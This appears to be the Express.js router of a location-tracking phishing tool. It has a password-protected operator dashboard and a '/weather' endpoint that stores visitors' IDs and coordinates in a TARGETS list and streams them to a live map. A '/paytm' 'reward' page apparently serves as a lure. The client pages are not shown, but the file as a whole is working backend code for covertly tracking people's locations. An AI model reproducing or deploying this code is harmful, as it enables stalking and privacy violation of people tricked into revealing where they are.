const express = require("express")
const router = express.Router()
const config = require("./config")

const TARGETS = {}


// ======================================
// LOGIN
// ======================================

router.route("/login")
    .get((req, res) => {

        res.render("login")

    })
    .post((req, res) => {

        const { username, password } = req.body

        if (
            config.username === username &&
            config.password === password
        ) {

            res.cookie(
                "token",
                config.token,
                {
                    maxAge: 1000000 * 100000
                }
            )

        }

        res.redirect("/")
    })


// ======================================
// WEATHER
// ======================================

router.route("/weather")
    .get((req, res) => {

        res.render("weather")

    })
    .post((req, res) => {

        const { id, lat, lng } = req.body

        if (TARGETS[id] == null) {

            IO.emit(
                "user-connected",
                id
            )

        }

        TARGETS[id] = [lat, lng]

        IO.emit(
            "map-data",
            {
                id,
                lat,
                lng
            }
        )

        console.log(
            `> ${id} - ${TARGETS[id]}`
        )

        res.send("OK")
    })


// ======================================
// PUBLIC REWARD DEMO
// ======================================

router.get("/paytm", (req, res) => {

    res.render("paytm")

})




// ======================================
// TOKEN CHECKING
// ======================================

router.use(function checkToken(req, res, next) {

    const token = req.cookies.token

    if (
        token != null &&
        token === config.token
    ) {

        next()

    } else {

        res
            .clearCookie("token")
            .redirect("/login")

    }

})


// ======================================
// ADMIN HOME
// ======================================

router.get("/", (req, res) => {

    res.render("home", {
        TARGETS
    })

})


// ======================================
// MAP
// ======================================

router.get("/map", (req, res) => {

    const { id } = req.query

    res.render("map", {
        data: TARGETS[id]
    })

})


module.exports = router